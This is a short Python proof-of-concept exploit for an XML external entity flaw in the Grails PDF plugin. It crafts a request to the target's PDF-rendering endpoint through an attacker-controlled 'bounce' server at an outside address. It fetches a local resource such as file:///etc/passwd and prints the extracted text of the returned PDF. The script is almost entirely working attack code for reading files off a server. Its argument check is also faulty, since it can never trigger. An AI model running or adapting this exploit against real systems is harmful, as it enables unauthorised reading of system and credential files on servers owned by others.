#!/usr/bin/python3
# Grails PDF Plugin XXE
# cf
# https://www.ambionics.io/blog/grails-pdf-plugin-xxe

import requests
import sys
import os

# Base URL of the Grails target
URL = 'http://10.0.0.179:8080/grailstest'
# "Bounce" HTTP Server
BOUNCE = 'http://10.0.0.138:7777/'


session = requests.Session()
pdfForm = '/pdf/pdfForm?url='
renderPage = 'render.html'

if len(sys.argv) < 0:
    print('usage: ./%s <resource>' % sys.argv[0])
    print('e.g.:  ./%s file:///etc/passwd' % sys.argv[0])
    exit(0)

resource = sys.argv[1]

# Build the full URL
full_url = URL + pdfForm + pdfForm + BOUNCE + renderPage
full_url += '&resource=' + sys.argv[1]

r = requests.get(full_url, allow_redirects=False)

#print(full_url)

if r.status_code != 200:
    print('Error: %s' % r)
else:
    with open('/tmp/file.pdf', 'wb') as handle:
        handle.write(r.content)
    os.system('pdftotext /tmp/file.pdf')
    with open('/tmp/file.txt', 'r') as handle:
        print(handle.read(), end='')